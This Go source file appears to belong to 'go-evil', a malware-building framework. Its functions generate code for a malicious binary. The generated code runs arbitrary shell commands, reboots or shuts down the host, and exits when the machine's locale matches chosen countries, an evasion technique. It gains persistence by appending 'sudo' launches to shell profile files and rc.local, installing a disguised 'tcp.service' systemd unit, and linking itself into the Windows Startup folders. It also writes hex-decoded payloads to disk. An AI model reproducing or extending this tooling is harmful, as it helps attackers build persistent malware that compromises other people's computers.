package system

import (
	"fmt"
	"strings"

	"github.com/TeamPhoneix/go-evil/utility/structure"
	"github.com/TeamPhoneix/go-evil/utility/tools"
)

//
//
// Exits the malware
//
//
func Exit(s_json string, return_code string) ([]string, string) {
	data_object := structure.Receive(s_json)

	function_call := "Exit"

	data_object.Add_go_function([]string{
		fmt.Sprintf("func %s(lvl string){", function_call),
		"lvl = spine.variable.get(lvl)",
		"value := tools.String_to_int(lvl)",
		"os.Exit(value)",

		"}"})

	data_object.Add_go_import("github.com/TeamPhoneix/go-evil/utility/tools")
	data_object.Add_go_import("os")

	return []string{fmt.Sprintf("%s(%s)", function_call, return_code)}, structure.Send(data_object)
}

//
//
// Prints a message to the screen
//
//
func Out(s_json string, msg string) ([]string, string) {
	data_object := structure.Receive(s_json)
	function_call := "Out"

	data_object.Add_go_function([]string{
		fmt.Sprintf("func %s(msg []int){", function_call),
		"s_msg := spine.alpha.construct_string(msg)",
		"s_msg = spine.variable.get(s_msg)",
		"fmt.Print(s_msg)",
		"}"})

	data_object.Add_go_import("fmt")
	parameter := "[]int{"
	for _, value := range tools.Generate_int_from_string(msg) {
		parameter += fmt.Sprintf("%d,", value)
	}
	parameter += "}"

	return []string{fmt.Sprintf("%s(%s)", function_call, parameter)}, structure.Send(data_object)
}

//
//
// Prints a message to the screen, but appends a newline at the end of each print
//
//
func Outln(s_json string, msg string) ([]string, string) {
	data_object := structure.Receive(s_json)
	function_call := "Outln"

	data_object.Add_go_function([]string{
		fmt.Sprintf("func %s(msg []int){", function_call),
		"s_msg := spine.alpha.construct_string(msg)",
		"s_msg = spine.variable.get(s_msg)",
		"fmt.Println(s_msg)",
		"}"})

	data_object.Add_go_import("fmt")

	parameter := "[]int{"
	for _, value := range tools.Generate_int_from_string(msg) {
		parameter += fmt.Sprintf("%d,", value)
	}
	parameter += "}"

	return []string{fmt.Sprintf("%s(%s)", function_call, parameter)}, structure.Send(data_object)
}

//
//
// Executes a command on the running OS and prints the result
//
//
func Exec(s_json string, cmd string) ([]string, string) {
	data_object := structure.Receive(s_json)
	function_call := "Exec"

	data_object.Add_go_function([]string{
		fmt.Sprintf("func %s(cmd string){", function_call),
		"cmd = spine.variable.get(cmd)",
		"split_cmd := strings.Split(cmd, \" \")",
		"cmd = strings.ReplaceAll(split_cmd[0], \"\\\"\", \"\")",
		"args := strings.ReplaceAll(strings.Join(split_cmd[1:], \" \"), \"\\\"\", \"\")",
		"out, err := exec.Command(cmd, args).Output()",
		"if err != nil {",
		"fmt.Println(err.Error())",
		"}else{",
		"fmt.Println(string(out[:]))",
		"}}"})

	data_object.Add_go_import("os/exec")
	data_object.Add_go_import("fmt")
	data_object.Add_go_import("strings")

	return []string{fmt.Sprintf("%s(%s)", function_call, cmd)}, structure.Send(data_object)
}

//
//
// Disables boot of the program in certain countries
// The countries are determined by value returned by jibber_jabber, formatted in ISO 639
//
//
func Abort(s_json string, languages string) ([]string, string) {
	data_object := structure.Receive(s_json)
	function_call := "Abort"

	arr := structure.Create_evil_object(languages)

	arr.Uppercase()                          // Makes the contents of the array to uppercase
	language_array := arr.To_string("array") // Returns []string{<content>}

	data_object.Add_go_function([]string{
		fmt.Sprintf("func %s(languages []string){", function_call),
		"computer_lang, err := jibber_jabber.DetectTerritory()",
		"if err != nil {",
		"fmt.Println(err.Error())",
		"}else{",
		"for _, lang := range languages{",
		"if lang == computer_lang{",
		"os.Exit(0)",
		"}}}}"})

	data_object.Add_go_import("os")
	data_object.Add_go_import("github.com/cloudfoundry/jibber_jabber")

	return []string{fmt.Sprintf("%s(%s)", function_call, language_array)}, structure.Send(data_object)
}

//
//
// Reboots the computer
//
//
func Reboot(s_json string) ([]string, string) {
	data_object := structure.Receive(s_json)
	function_call := "Reboot"

	cmd := ""
	if data_object.Target_os == "windows" {
		cmd = "shutdown /r"
	} else {
		cmd = "shutdown -r now"
	}

	data_object.Add_go_function([]string{
		fmt.Sprintf("func %s(){", function_call),

		fmt.Sprintf("exec.Command(\"%s\").Run()", cmd),
		"}"})

	data_object.Add_go_import("os/exec")

	return []string{fmt.Sprintf("%s()", function_call)}, structure.Send(data_object)

}

//
//
// Shutdowns the computer
//
//
func Shutdown(s_json string) ([]string, string) {
	data_object := structure.Receive(s_json)
	function_call := "Shutdown"

	cmd := ""
	if data_object.Target_os == "windows" {
		cmd = "shutdown /s"
	} else {
		cmd = "shutdown -h now"
	}

	data_object.Add_go_function([]string{
		fmt.Sprintf("func %s(){", function_call),

		fmt.Sprintf("exec.Command(\"%s\").Run()", cmd),
		"}"})

	data_object.Add_go_import("os/exec")

	return []string{fmt.Sprintf("%s()", function_call)}, structure.Send(data_object)
}

//
//
// Add the malware to startup
//
//
func Add_to_startup(s_json string) ([]string, string) {
	data_object := structure.Receive(s_json)
	function_call := "Add_2_startup"

	if data_object.Target_os == "windows" {
		data_object.Add_go_function([]string{
			fmt.Sprintf("func %s(){", function_call),
			"malware_path, _ := os.Executable()",
			"os.Link(malware_path, \"%AppData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\")",
			"os.Link(malware_path, \"%ProgramData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\")",
			"}"})

	} else {
		data_object.Add_go_function([]string{
			fmt.Sprintf("func %s(){", function_call),
			"malware_path, _ := os.Executable()",

			"for _, line := range []string{\"/etc/profile\", \"~/.bash_profile\", \"~/.bash_login\", \"~/.profile\", \"/etc/rc.local\"} {",
			"in, err := os.OpenFile(line, os.O_APPEND|os.O_WRONLY, 0644)",
			"if err == nil {",
			"in.WriteString(\"sudo .\" + malware_path + \" &\")",
			"}",
			"}",

			"in, err := os.Create(\"/lib/systemd/system/tcp.service\")",
			"if err == nil {",
			"write := bufio.NewWriter(in)",
			"what_to_write := []string{",
			"\"[Unit]\",",
			"\"Description=My Sample Service\",",
			"\"After=multi-user.target\",",

			"\"[Service]\",",
			"\"Type=idle\",",
			"\"ExecStart=.malware_path\",",

			"\"[Install]\",",
			"\"WantedBy=multi-user.target\",",

			"}",

			"for _, line := range what_to_write {",
			"write.WriteString(line)",
			"}",
			"exec.Command(\"sudo\", \"systemctl\", \"enable\", \"tcp.service\").Run()",
			"exec.Command(\"sudo\", \"systemctl\", \"start\", \"tcp.service\").Run()",
			"}}"})
	}
	data_object.Add_go_import("os/exec")
	data_object.Add_go_import("bufio")

	data_object.Add_go_import("os")

	return []string{fmt.Sprintf("%s()", function_call)}, structure.Send(data_object)
}

//
//
// Writes a provided content to a provided file
//
//
func write(s_json string, value string) ([]string, string) {
	data_object := structure.Receive(s_json)
	function_call := "Write"

	arr := structure.Create_evil_object(value)
	path := arr.Get(0)
	data := strings.Join(arr.Get_between(1, arr.Length()), " ")

	if data_object.Check_global_name(data) { // Checks if what we got is a global variable
		data = tools.Erase_delimiter(data, []string{"\""}, -1)
	}

	data_object.Add_go_function([]string{
		fmt.Sprintf("func %s(path string, content string){", function_call),
		"path = spine.variable.get(path)",
		"content = spine.variable.get(content)",

		"file, result := os.Create(path)",
		"if result == nil{",
		"defer file.Close()",
		"result := tools.Starts_with(content, []string{\"[HEX];\"})",
		"if ok := result[\"[HEX];\"]; !ok {",
		"file.WriteString(content)",
		"}else{",
		"split := strings.Split(content, \",\")",
		"for _, data := range split {",
		"data, _ := hex.DecodeString(data)",
		"file.Write(data)",
		"}}}}",
	})

	data_object.Add_go_import("encoding/hex")
	data_object.Add_go_import("os")
	data_object.Add_go_import("strings")
	data_object.Add_go_import("github.com/TeamPhoneix/go-evil/utility/tools")

	return []string{fmt.Sprintf("%s(\"%s\", \"%s\")", function_call, path, data)}, structure.Send(data_object)
}

//
//
// Reads the contents of a file and places the result into a runtime variable
//
//
func read(s_json string, value string) ([]string, string) {
	data_object := structure.Receive(s_json)
	function_call := "read"
	value = tools.Erase_delimiter(value, []string{"\""}, -1)

	data_object.Add_go_function([]string{
		fmt.Sprintf("func %s(path string){", function_call),
		"path = spine.variable.get(path)",
		"gut, err := ioutil.ReadFile(path)",
		"if err == nil{",
		"spine.variable.set(string(gut))",
		"}}"})

	data_object.Add_go_import("io/ioutil")

	return []string{fmt.Sprintf("%s(\"%s\")", function_call, value)}, structure.Send(data_object)

}

//
//
// Reads the contents of a directory and places the result into a runtime variable
//
//
func list_dir(s_json string, value string) ([]string, string) {
	data_object := structure.Receive(s_json)
	function_call := "list_dir"
	data_object.Add_go_function([]string{
		fmt.Sprintf("func %s(path string){", function_call),
		"path = spine.variable.get(path)",
		"result, err := ioutil.ReadDir(path)",
		"if err == nil{",
		"contents := []string{}",
		"for _, file := range result{",
		"contents = append(contents, file.Name())",
		"}}}"})
	data_object.Add_go_import("io/ioutil")

	return []string{fmt.Sprintf("%s(\"%s\")", function_call, value)}, structure.Send(data_object)

}

//
//
// Takes a user input and saves the result in a runtime variable
//
//
func input(s_json string) ([]string, string) {
	data_object := structure.Receive(s_json)
	function_call := "input"
	data_object.Add_go_function([]string{
		fmt.Sprintf("func %s(){", function_call),
		"var input string",
		"fmt.Scanln(&input)",
		"spine.variable.set(input)",
		"}"})

	return []string{fmt.Sprintf("%s()", function_call)}, structure.Send(data_object)

}
